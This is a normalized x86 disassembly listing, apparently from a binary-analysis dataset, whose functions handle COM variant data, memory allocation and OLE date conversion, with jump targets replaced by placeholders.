mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ ebp - 0x18 ]
xor esi esi
cmp eax esi
mov [ ebp - 0x4 ] esi
jne r-xdata
mov eax [ ebp - 0x1c ]
lea edx [ ebx + 0x14 ]
push edx
lea edx [ ebx + 0xc ]
mov ecx [ eax ]
push edi
push edx
push eax
call [ ecx + 0xc ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x1c ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] esi
mov eax [ ebp - 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
cmp eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ ebx + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
lea esi [ esi + esi * 2 ]
shl esi 0x4
add eax esi
cmp [ eax + 0x10 ] 0x400
ja r-xdata
je r-xdata
mov eax [ ebx + 0xc ]
and [ ebp - 0x18 ] 0x0
imul eax eax 0x34
push eax
mov [ ebp - 0x4 ] 0x2
call sub_41b806
pop ecx
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
mov eax esi
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push [ ebp + 0x8 ]
and [ ebx + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x6
call sub_41b806
pop ecx
mov [ ebx + 0x8 ] eax
jmp r-xdata
push 0x1
mov ecx ebx
call sub_408b6d
mov esi eax
test esi esi
jge r-xdata
and [ ebp - 0x2c ] 0x0
push 0x14
mov [ ebp - 0x4 ] 0x4
call sub_41b806
pop ecx
mov edx eax
jmp r-xdata
cmp [ eax + 0x14 ] 0xd
je r-xdata
mov eax 0x8007000e
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ ebp - 0x4 ] 0x0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x4 ] 0x1
push [ ebp - 0x18 ]
call sub_41b82f
pop ecx
jmp r-xdata
and [ ebp - 0x4 ] 0x0
test edx edx
je r-xdata
xor edx edx
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
push [ ebx ]
push [ ebx + 0xc ]
push [ ebp - 0x18 ]
call sub_408bc9
push [ ebp - 0x18 ]
mov esi eax
call sub_41b82f
add esp 0x18
push [ ebp - 0x18 ]
call sub_41b82f
pop ecx
mov eax [ ebp - 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
test eax eax
and [ edx ] 0x0
lea edi [ edx + 0x4 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x20 ]
mov eax [ ebx + 0x10 ]
lea esi [ esi + esi * 2 ]
shl esi 0x4
mov [ eax + esi + 0x14 ] 0xd
mov eax [ ebx + 0x10 ]
mov [ eax + esi + 0x10 ] 0x4
mov eax [ ebx + 0x10 ]
add eax esi
mov cx [ eax + 0x14 ]
cmp cx 0x81
je r-xdata
inc [ eax + 0x10 ]
cmp cx 0x82
jne r-xdata
cmp esi [ ebx + 0xc ]
jae r-xdata
mov eax [ ebx + 0x10 ]
push edx
add eax esi
mov edi [ eax + 0x10 ]
mov ecx edi
and ecx 0x3
add ecx edi
add ecx [ ebp + 0x8 ]
lea edi [ ecx + 0x4 ]
push edi
push ecx
push [ ebp + 0x8 ]
mov cl [ eax + 0x17 ]
push 0x0
push ecx
mov cl [ eax + 0x16 ]
push ecx
mov cx [ eax + 0x14 ]
push [ eax + 0x10 ]
push ecx
push [ eax + 0x8 ]
push [ ebp - 0x24 ]
call sub_408c13
mov eax [ ebx + 0x10 ]
add [ ebp - 0x24 ] 0x34
mov ecx [ ebp + 0x8 ]
add esp 0x2c
add edi 0x4
inc [ ebp - 0x20 ]
mov [ eax + esi + 0x4 ] ecx
mov esi [ ebp - 0x20 ]
mov [ ebp + 0x8 ] edi
jmp r-xdata
sub_408b6d
mov eax sub_426420
call sub_40cc20
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
and [ ebp - 0x4 ] 0x0
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
and [ esi ] 0x0
mov [ esi + 0x4 ] eax
shl eax 0x3
push eax
call sub_41b806
pop ecx
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0xc ]
neg eax
sbb eax eax
pop edi
and eax 0x7ff8fff2
pop esi
add eax 0x8007000e
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_408bc9
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0xc ]
mov eax [ esi + 0x24 ]
push 0x0
push [ ebp + 0x10 ]
mov edx [ ecx ]
neg eax
push [ ebp + 0x14 ]
sbb eax eax
and eax 0x2
push esi
inc eax
push edi
inc eax
push eax
push ecx
call [ edx + 0x10 ]
test edi edi
mov ebx eax
jle r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
pop ebp
retn
add esi 0x14
push [ esi ]
call sub_41b82f
add esi 0x34
dec edi
pop ecx
jne r-xdata
sub_408c13
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push esi
push edi
xor ecx ecx
push 0x1
test dh 0x40
pop esi
je r-xdata
mov [ eax + 0x20 ] ecx
mov [ eax + 0x20 ] esi
jmp r-xdata
mov edx [ ebp + 0x2c ]
cmp edx ecx
je r-xdata
mov [ eax + 0x1c ] 0x3
mov [ eax + 0x8 ] edx
mov edi [ ebp + 0x30 ]
mov [ eax + 0x30 ] dx
mov dl [ ebp + 0x18 ]
mov [ eax + 0x14 ] edi
mov edi [ ebp + 0x20 ]
mov [ eax + 0x32 ] dl
mov dl [ ebp + 0x1c ]
mov [ eax + 0x24 ] edi
mov edi [ ebp + 0xc ]
mov [ eax + 0x33 ] dl
mov edx [ ebp + 0x24 ]
mov [ eax ] edi
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x14 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0x28 ]
mov [ eax + 0x1c ] esi
pop edi
cmp edx ecx
mov [ eax + 0x2c ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x18 ] ecx
pop esi
je r-xdata
pop ebp
retn
or [ eax + 0x1c ] 0x4
mov [ eax + 0xc ] edx
sub_408c92
mov ecx [ esp + 0x4 ]
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov eax [ ebx + 0x10 ]
mov [ ecx + 0x10 ] eax
mov eax [ ebx + 0x10 ]
sub eax 0x0
je r-xdata
mov esi ebx
mov edi ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec eax
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push [ ebx + 0x14 ]
push eax
call sub_40e27b
pop ecx
pop ecx
mov esi ebx
mov edi ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x14 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
dec eax
je r-xdata
push 0x1
pop eax
push [ ebx + 0x14 ]
call sub_40d3c3
pop ecx
lea eax [ eax + eax + 0x2 ]
push eax
call [ CoTaskMemAlloc@IAT ]
mov ecx [ esp + 0x10 ]
test eax eax
mov [ ecx + 0x14 ] eax
je r-xdata
jmp r-xdata
sub_408cfe
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
push edi
mov eax [ esi ]
je r-xdata
mov ecx esi
call [ eax + 0x14 ]
mov eax [ esi + 0x10 ]
xor ecx ecx
cmp eax ebx
mov [ ebp + 0xc ] eax
jle r-xdata
push ebx
push [ ebp + 0x8 ]
call [ eax + 0x8 ]
cmp [ esi + 0x48 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov esi [ esi + 0x14 ]
lea edi [ esi + 0x24 ]
jmp r-xdata
xor edi edi
cmp [ esi + 0x10 ] ebx
jle r-xdata
xor edi edi
cmp [ esi + 0x10 ] ebx
jle r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x90 ] 0x0
jmp r-xdata
mov eax [ esi + 0x14 ]
mov eax [ ebx + eax + 0x1c ]
test eax eax
je r-xdata
mov ebx [ esi + 0x54 ]
lea eax [ edi + 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0xc ]
mov ecx ebx
push eax
call sub_408e3a
test al al
je r-xdata
inc ecx
add edi 0x28
cmp ecx [ ebp + 0xc ]
jl r-xdata
mov edx eax
mov ebx eax
mov eax [ eax ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp + 0x8 ]
je r-xdata
inc edi
add ebx 0x28
cmp edi [ esi + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push eax
mov ecx [ ecx + 0x9c ]
push ecx
call sub_40cd7c
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
lea eax [ ecx + ecx * 4 ]
push ebx
mov ecx [ esi + eax * 8 + 0x24 ]
call sub_41a861
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ esi + 0x14 ]
push [ ebp + 0x8 ]
lea eax [ edi + edi * 4 ]
mov ecx [ ecx + eax * 8 + 0x24 ]
call sub_41a814
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi [ esi + 0x10 ]
jl r-xdata
push eax
lea ecx [ ebp - 0x4 ]
call sub_41c3d4
mov eax [ ebp + 0x8 ]
push [ ebp - 0x4 ]
mov eax [ eax + 0x9c ]
push eax
call sub_40cd7c
mov ebx eax
pop ecx
neg ebx
pop ecx
sbb bl bl
lea ecx [ ebp - 0x4 ]
inc bl
call sub_41c358
test bl bl
jne r-xdata
sub_408e3a
cmp [ ecx + 0x18 ] 0x0
push esi
push edi
je r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ esp + 0xc ]
mov ecx [ ecx + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ esi ]
lea ecx [ ecx + edx - 0x1 ]
cmp eax ecx
ja r-xdata
mov esi [ ecx + 0xc ]
xor edi edi
test esi esi
jbe r-xdata
xor al al
jmp r-xdata
sub eax edx
mov [ esi ] eax
mov edx [ esp + 0xc ]
mov ecx [ ecx + 0x10 ]
add ecx 0x8
mov eax [ edx ]
pop edi
pop esi
retn 0x4
mov [ edx ] edi
jmp r-xdata
inc edi
add ecx 0x30
cmp edi esi
jb r-xdata
mov al 0x1
cmp [ ecx ] eax
je r-xdata
sub_408e8d
cmp [ esp + 0x8 ] 0x0
push esi
mov esi ecx
mov eax [ esi ]
je r-xdata
mov ecx esi
call [ eax + 0x14 ]
push 0x0
add esi 0x18
push [ esp + 0xc ]
mov ecx esi
call sub_41a898
test eax eax
je r-xdata
push 0x0
push [ esp + 0xc ]
call [ eax + 0x4 ]
push [ esp + 0x8 ]
lea ecx [ esi + 0x18 ]
call sub_41a814
jmp r-xdata
pop esi
retn 0x8
push eax
mov ecx esi
call sub_41a861
sub_408ed5
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x48 ] edi
je r-xdata
cmp [ esi + 0x40 ] edi
push ebx
je r-xdata
call sub_40907f
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov [ esi + 0x38 ] edi
cmp ecx edi
jle r-xdata
cmp [ esi + 0x38 ] edi
jle r-xdata
pop edi
pop esi
leave
retn
mov eax [ esi + 0x38 ]
cmp eax edi
jle r-xdata
mov eax [ esi + 0x14 ]
add eax 0x24
cmp [ esi + 0x38 ] 0x0
jle r-xdata
xor ebx ebx
xor edi edi
cmp [ esi + 0x10 ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] edi
jle r-xdata
lea eax [ eax + eax * 2 ]
shl eax 0x4
push eax
call sub_41b806
pop ecx
mov [ esi + 0x3c ] eax
mov edx [ eax ]
add eax 0x28
mov edx [ edx + 0xc ]
add [ esi + 0x38 ] edx
dec ecx
jne r-xdata
xor edi edi
mov [ esi + 0x40 ] edi
push [ esi + 0x40 ]
call sub_41b82f
push [ esi + 0x3c ]
call sub_41b82f
pop ecx
pop ecx
mov eax ebx
add eax [ esi + 0x40 ]
push eax
call [ VariantClear@IAT ]
inc edi
add ebx 0x10
cmp edi [ esi + 0x38 ]
jl r-xdata
mov ecx [ esi + 0x38 ]
mov eax [ esi + 0x8 ]
mov edi ecx
push 0x0
mov edx [ eax ]
shl edi 0x4
push edi
push [ esi + 0x3c ]
push ecx
push eax
call [ edx + 0x10 ]
mov eax [ esi + 0x38 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ ebp - 0x8 ] edi
xor edi edi
cmp [ esi + 0x38 ] ebx
jle r-xdata
shl eax 0x4
push eax
call sub_41b806
pop ecx
mov [ esi + 0x40 ] eax
inc [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x28
mov eax [ ebp - 0xc ]
cmp eax [ esi + 0x10 ]
jl r-xdata
lea edi [ edi + edi * 2 ]
shl edi 0x4
mov ecx esi
call sub_40907f
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
pop ebx
mov eax ebx
push 0x10
add eax [ esi + 0x40 ]
push 0x0
push eax
call sub_40cc70
mov eax [ esi + 0x40 ]
add esp 0xc
and [ ebx + eax ] 0x0
inc edi
add ebx 0x10
cmp edi [ esi + 0x38 ]
jl r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + eax + 0x24 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
mov ebx [ ebx ]
mov ecx esi
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
add eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x3c ]
add eax edi
push eax
call sub_408c92
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x3c ]
shl eax 0x4
mov [ ecx + edi + 0x18 ] eax
mov eax [ esi + 0x3c ]
mov ecx [ ebp - 0x10 ]
and [ eax + edi + 0x1c ] 0x0
mov eax [ esi + 0x3c ]
or [ eax + edi + 0x24 ] 0xffffffff
mov eax [ esi + 0x3c ]
or [ eax + edi + 0x20 ] 0xffffffff
mov eax [ esi + 0x3c ]
inc [ ebp - 0x4 ]
mov [ eax + edi + 0x28 ] 0x1
mov eax [ esi + 0x3c ]
mov ecx [ ecx + 0x98 ]
mov [ eax + edi + 0x2c ] ecx
add edi 0x30
test ebx ebx
jne r-xdata
mov edi [ ebp - 0x4 ]
sub_40907f
push ebp
mov ebp esp
sub esp 0x18
xor edx edx
cmp [ ecx + 0x48 ] edx
je r-xdata
cmp [ ecx + 0x38 ] edx
jne r-xdata
mov ecx [ ecx + 0x50 ]
cmp ecx edx
je r-xdata
mov eax [ ecx + 0x40 ]
push ebx
mov ecx [ ecx + 0x8 ]
push esi
push edi
push 0x1
mov [ ebp - 0x10 ] eax
pop eax
lea ebx [ ebp - 0x18 ]
xor esi esi
push ebx
push edx
push esi
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov edi [ ecx ]
push r--data
push eax
push ecx
call [ edi + 0x20 ]
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
leave
retn
cmp [ ecx + 0xc ] edx
je r-xdata
call sub_408850
leave
retn
sub_4090dc
mov eax sub_4264e0
call sub_40cc20
sub esp 0x134
and [ ebp - 0x3c ] 0x0
push ebx
push esi
lea eax [ ebp - 0x1c ]
push edi
mov esi ecx
push eax
call sub_40b948
mov edi [ ebp + 0xc ]
mov ecx [ esi + 0x54 ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x3c ]
push eax
push edi
call sub_409858
cmp [ ebp - 0x3c ] 0x3
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_40b7f0
lea eax [ ebp - 0x1c ]
push eax
call [ VariantClear@IAT ]
jmp r-xdata
mov ebx [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx ebx
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov eax [ ebp + 0xc ]
mov ecx [ ebx + 0x10 ]
mov ebx [ VariantClear@IAT ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov ax [ ecx + eax + 0x14 ]
mov ecx 0x81
movzx eax ax
cmp eax ecx
jg r-xdata
sub eax 0x82
je r-xdata
cmp eax ecx
je r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
dec eax
je r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
cmp eax 0x8
jg r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
dec eax
dec eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
cmp eax 0xb
je r-xdata
je r-xdata
push eax
lea ecx [ ebp - 0x40 ]
call sub_41c3d4
mov eax [ eax ]
push 0x8
push eax
lea ecx [ ebp - 0x140 ]
mov [ ebp - 0x4 ] 0x4
call sub_40b810
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x5
call sub_40b92e
lea eax [ ebp - 0x140 ]
push eax
call ebx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x40 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
call sub_40b7f0
lea eax [ ebp - 0x1c ]
push eax
call ebx
push [ ebp + 0xc ]
mov ecx esi
call sub_40989c
mov esi eax
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
fild [ ebp - 0x35 ]
mov al [ ebp - 0x37 ]
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
dec eax
je r-xdata
call sub_41c358
push eax
lea ecx [ ebp - 0x44 ]
call sub_41c382
mov eax [ eax ]
push 0x8
push eax
lea ecx [ ebp - 0x120 ]
mov [ ebp - 0x4 ] 0x2
call sub_40b810
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x3
call sub_40b92e
lea eax [ ebp - 0x120 ]
push eax
call ebx
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x44 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
cmp eax 0xc
je r-xdata
dec eax
dec eax
je r-xdata
cmp [ ebp - 0x36 ] 0x0
jne r-xdata
fld st0
fmul [ r--data ]
fstp st1
jmp r-xdata
push [ ebp + 0xc ]
mov ecx esi
call sub_40989c
mov esi eax
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
fldz
fstp [ ebp - 0x34 ]
movsw [ edi ] [ esi ]
movzx eax [ ebp - 0x20 ]
movzx ecx [ ebp - 0x22 ]
movsx edx [ ebp - 0x24 ]
xor esi esi
push esi
push esi
push esi
push eax
push ecx
push edx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x2c ] esi
call sub_40ba98
fld [ ebp - 0x34 ]
mov [ ebp - 0x74 ] 0x7
fstp [ ebp - 0x6c ]
lea eax [ ebp - 0x74 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xf
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x74 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
dec eax
jne r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
cmp eax 0xf
jle r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
dec eax
je r-xdata
fstp [ ebp - 0x7c ]
mov [ ebp - 0x84 ] 0x5
lea eax [ ebp - 0x84 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xe
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x84 ]
jmp r-xdata
fld st0
fchs
fstp st1
mov cl al
dec al
test cl cl
jbe r-xdata
push eax
call ebx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea edi [ ebp - 0x24 ]
and [ ebp - 0x2c ] 0x0
lea eax [ eax + eax * 2 ]
shl eax 0x4
fldz
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
fstp [ ebp - 0x34 ]
mov esi eax
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movzx eax [ ebp - 0x20 ]
movzx ecx [ ebp - 0x22 ]
movzx edx [ ebp - 0x24 ]
push eax
push ecx
push edx
push 0x1e
push 0xc
push 0x76b
lea ecx [ ebp - 0x34 ]
call sub_40ba98
fld [ ebp - 0x34 ]
mov [ ebp - 0xa4 ] 0x7
fstp [ ebp - 0x9c ]
lea eax [ ebp - 0xa4 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x10
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xa4 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
mov ax [ eax ]
push 0xb
push eax
lea ecx [ ebp - 0x100 ]
call sub_40b88b
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0xb
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x100 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
cmp eax 0x11
jle r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea edi [ ebp - 0x38 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movzx eax [ ebp - 0x2e ]
movzx ecx [ ebp - 0x30 ]
movzx edx [ ebp - 0x32 ]
movzx esi [ ebp - 0x34 ]
movsx edi [ ebp - 0x38 ]
push eax
push ecx
movzx eax [ ebp - 0x36 ]
push edx
push esi
push eax
push edi
lea ecx [ ebp - 0xe0 ]
call sub_40ba98
fld [ ebp - 0xe0 ]
mov [ ebp - 0xd4 ] 0x7
fstp [ ebp - 0xcc ]
lea eax [ ebp - 0xd4 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x11
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xd4 ]
push eax
lea ecx [ ebp - 0x130 ]
call sub_40b7f0
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x130 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
cmp eax 0x12
je r-xdata
mov ax [ eax ]
push 0x2
push eax
lea ecx [ ebp - 0x110 ]
call sub_40b88b
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x7
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x110 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
dec eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
cmp eax 0x13
jne r-xdata
push 0x3
lea ecx [ ebp - 0xf0 ]
push [ eax ]
call sub_40b8c1
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x8
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xf0 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
dec eax
je r-xdata
mov al [ eax ]
mov [ ebp - 0xb4 ] 0x11
mov [ ebp - 0xac ] al
lea eax [ ebp - 0xb4 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xb4 ]
jmp r-xdata
fld [ eax ]
mov [ ebp - 0x64 ] 0x4
fstp [ ebp - 0x5c ]
lea eax [ ebp - 0x64 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x64 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
dec eax
jne r-xdata
fld [ eax ]
mov [ ebp - 0x94 ] 0x5
fstp [ ebp - 0x8c ]
lea eax [ ebp - 0x94 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xa
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x94 ]
